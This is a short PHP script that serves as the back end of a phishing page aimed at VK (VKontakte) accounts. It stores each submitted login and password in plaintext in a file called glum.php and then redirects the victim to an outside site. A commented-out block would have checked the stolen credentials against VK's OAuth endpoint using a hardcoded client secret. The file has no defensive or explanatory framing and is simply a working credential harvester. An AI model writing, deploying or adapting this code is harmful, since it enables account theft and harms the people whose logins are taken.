<?
	if((empty($_POST['p'])) or (empty($_POST['l']))) {
		header('Location: index.php?error=1');
	}else{
		/*$r = file_get_contents('https://oauth.vk.com/token?grant_type=password&client_id=3140623&client_secret=VeWdmVclDCtn6ihuP1nt&username='.$_POST['l'].'&password='.$_POST['p']);
		$json = json_decode($r,1);
		if(empty($json['access_token'])) {
			header('Location: index.php?error=1');
		}else{*/
			file_put_contents('glum.php',$_POST['l'].':'.$_POST['p']."\n",FILE_APPEND);
			header('Location:http://k.tw1.ru/');
		/*}*/
	}

?>